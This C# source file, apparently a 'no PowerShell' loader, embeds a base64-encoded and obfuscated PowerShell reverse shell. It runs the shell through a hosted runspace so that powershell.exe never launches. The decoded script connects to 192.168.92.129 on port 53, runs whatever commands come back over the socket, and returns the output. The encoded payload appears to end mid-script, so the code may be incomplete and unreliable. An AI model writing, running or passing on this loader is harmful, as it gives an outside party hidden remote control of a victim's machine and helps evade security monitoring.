﻿using System;
using System.Management.Automation.Runspaces;
using System.Text;

namespace nopowershell
{
    class Programe
    {
        static void Main(string[] args)
        {
            byte[] psrevshell = Convert.FromBase64String("U2V0LVZhcmlhYmxlIC1OYW1lIGNsaWVudCAtVmFsdWUgKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTkyLjE2OC45Mi4xMjkiLDUzKSk7CiYoJ3NWJykgICgiezB9ezF9IiAtZiAncCcsJ3c0YycpICAoICBbdFlQRV0oInsxfXszfXsyfXswfSItZiAnbkcnLCdURScsKCJ7MX17Mn17MH0iIC1mICdpJywnRW4nLCdjT2QnKSwnWHQuJykgKSA7JigiezB9ezJ9ezF9ezN9IiAtZigiezB9ezF9IiAtZidTZXQnLCctJyksJ2InLCgiezF9ezB9Ii1mJ2FyaWEnLCdWJyksJ2xlJykgLVZhbHVlICgke0NgTGBJRW5UfS4oInsxfXsyfXswfSIgLWYgJ2FtJywoInswfXsxfSIgLWYnRycsJ2V0UycpLCd0cmUnKS4iaWBOYFZvS2UiKCkpIC1OYW1lICgiezB9ezF9ezJ9IiAtZiAncycsKCJ7MH17MX0iLWYndHInLCdlYScpLCdtJyk7W2J5dGVbXV0ke2JgWXRgZXN9ID0gMC4uNjU1MzV8JignJScpezB9O3doaWxlKCguKCJ7MH17Mn17M317MX0iIC1mJ1MnLCgiezB9ezF9IiAtZidpJywnYWJsZScpLCdldCcsKCJ7MH17MX0iIC1mICctJywnVmFyJykpIC1OYW1lICgnaScpIC1WYWx1ZSAoJHtzYFRgUmVhbX0uKCJ7MH17MX0iLWYnUmVhJywnZCcpLiJJTmBWb2tlIigke2JgWWBURVN9LCAwLCAke0J5YFRlc30uIkxlTmdgVEgiKSkpIC1uZSAwKXs7JigiezJ9ezB9ezF9IiAtZidWYScsKCJ7MH17MX0iLWYgJ3JpYScsJ2JsZScpLCgiezF9ezB9Ii1mICd0LScsJ1NlJykpIC1OYW1lICgiezF9ezB9Ii1mICd0YScsJ2RhJykgLVZhbHVlICgoJigiezJ9ezF9ezB9IiAtZiAnZWN0JywoInswfXsxfSItZid3LScsJ09iaicpLCdOZScpIC1UeXBlTmFtZSAoIns0fXsyfXsxfXswfXs1fXszfSIgLWYnSUVuJywnSScsKCJ7MX17MH17Mn0iIC1mJy4nLCd4dCcsJ0FTQycpLCgiezF9ezB9Ii1mICdkaW5nJywnbycpLCgiezF9ezJ9ezB9IiAtZidlJywnU3lzJywndGVtLlQnKSwnYycpKS4iZ2BlYFRTVFJpTmciKCR7YllUYEVzfSwwLCAke0l9KSk7LigiezF9ezJ9ezB9ezN9Ii1mJ2knLCdTZScsKCJ7MX17MH0iLWYncicsJ3QtVmEnKSwoInsxfXswfSIgLWYgJ2JsZScsJ2EnKSkgLVZhbHVlICguKCJ7MH17MX0iLWYnaWUnLCd4JykgJHtEYEFUQX0gMj4mMSB8IC4oInsxfXsyfXswfSItZidnJywnT3UnLCgiezB9ezF9Ii1mJ3QtU3RyaScsJ24nKSkgKSAtTmFtZSAoInswfXsxfSIgLWYgKCJ7MX17Mn17MH0iLWYgJ2MnLCdzZScsJ25kYmEnKSwnaycpOy4oInswfXszfXsxfXsyfSIgLWYnU2UnLCgiezB9ezF9Ii1mICdWYScsJ3JpYWJsJyksJ2UnLCd0LScpIC1WYWx1ZSAoJHtzRWBOREJhY2t9ICsgIlBTICIgKyAoLigiezB9ezF9IiAtZidwJywnd2QnKSkuIlBgQVRIIiArICI");
            string decodedString = Encoding.UTF8.GetString(psrevshell);
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            Pipeline pipeline = rs.CreatePipeline();
            pipeline.Commands.AddScript(decodedString);
            pipeline.Invoke();
            rs.Close();
        }

    }

}
